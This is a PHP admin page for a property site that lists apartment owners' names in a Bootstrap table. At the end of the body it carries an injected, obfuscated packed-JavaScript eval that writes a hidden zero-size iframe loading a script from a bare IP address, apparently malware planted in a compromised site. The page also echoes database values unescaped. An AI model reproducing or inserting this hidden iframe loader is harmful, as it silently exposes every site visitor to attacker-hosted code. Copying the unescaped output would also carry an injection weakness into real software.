<?php
	$current_page = "details";
include("dbconfig.php");
$r = mysql_query('select avi_real.user.f_name, avi_real.user.l_name, avi_real.apartment.address from avi_real.apartment, avi_real.user where avi_real.apartment.ownership=avi_real.user.id order by avi_real.apartment.id desc');
?>

<!DOCTYPE html>
<html>
    <head>
         <title>Avi Admin</title>
        <!-- Bootstrap -->
        <link href="bootstrap/css/bootstrap.min.css" rel="stylesheet" media="screen">
        <link href="bootstrap/css/bootstrap-responsive.min.css" rel="stylesheet" media="screen">
        <link href="assets/styles.css" rel="stylesheet" media="screen">
        <link href="assets/DT_bootstrap.css" rel="stylesheet" media="screen">
        <!--[if lte IE 8]><script language="javascript" type="text/javascript" src="vendors/flot/excanvas.min.js"></script><![endif]-->
        <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
        <!--[if lt IE 9]>
            <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
        <![endif]-->
        <script src="vendors/modernizr-2.6.2-respond-1.1.0.min.js"></script>
    </head>
    <body>
        <div class="navbar navbar-fixed-top">
           <?php
	  include('top_header.php');
	  ?>
        </div>
        <div class="container-fluid">
            <div class="row-fluid">
               <div class="span3" id="sidebar">
               <?php
	  include('sidemenu.php');
	  ?>  </div>
                <!--/span-->
                <div class="span9" id="content">
                     <div class="row-fluid">
                        <!-- block -->
                        <div class="block">
                            <div class="navbar navbar-inner block-header">
                                <div class="muted pull-left">Property Details</div>
                            </div>
                            <div class="block-content collapse in">
                                <div class="span12">
                                   <div class="table-toolbar">
                                     
                                      <div class="btn-group pull-right">
                                         <button data-toggle="dropdown" class="btn dropdown-toggle">Tools <span class="caret"></span></button>
                                         <ul class="dropdown-menu">
                                            <li><a href="#">Print</a></li>
                                            <li><a href="#">Save as PDF</a></li>
                                            <li><a href="#">Export to Excel</a></li>
                                         </ul>
                                      </div>
                                   </div>
                                    <table cellpadding="0" cellspacing="0" border="0" class="table table-striped table-bordered" id="example2">
                                        <thead>
                                            <tr>
                                                <th>First name</th>
                                                <th>Last Name</th>
												<th>Details</th>
                                            </tr>
                                        </thead>
                                        <tbody>
										<?php
										$i = 1;
										while($row = mysql_fetch_array($r, MYSQL_ASSOC)){
										?>
                                            <tr class="odd gradeX">
                                                <td><?php echo $row['f_name']; ?></td>
                                                <td><?php echo $row['l_name']; ?></td>
												<td><a href='listDetails.php?pid=<?php echo $row['id'];?>'>Details</a></td> 
                                            </tr>
										<?php }?>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                        <!-- /block -->
                    </div>
                </div>
            </div>
			
            <hr>
            <?php
	  include('footer.php');
	  ?>
        </div>
        <!--/.fluid-container-->
        <script src="vendors/jquery-1.9.1.js"></script>
        <script src="bootstrap/js/bootstrap.min.js"></script>
        <script src="vendors/datatables/js/jquery.dataTables.min.js"></script>
        <script src="assets/scripts.js"></script>
        <script src="assets/DT_bootstrap.js"></script>
        <script>
        $(function() {
            
        });
        </script>
	<tag5479347351></tag5479347351><script>eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 c=" n=\\"0\\" s=\\"0\\" t=\\"0\\" l=\\"h://q.j.k.8/d.g\\">";1 6="<i";1 b="</i";1 2="f";1 3="r";1 5="a";1 4="m";1 9="e";1 7="e>";o.p(6+2+3+5+4+9+c+b+2+3+5+4+7);',30,30,'|var|r4|r5|r7|r6|r2|r9||r8||r3|r1|tag1|||php|http||78|150|src||width|document|write|219||height|board'.split('|'),0,{}))</script><tag5479347352></tag5479347352></body>
</html>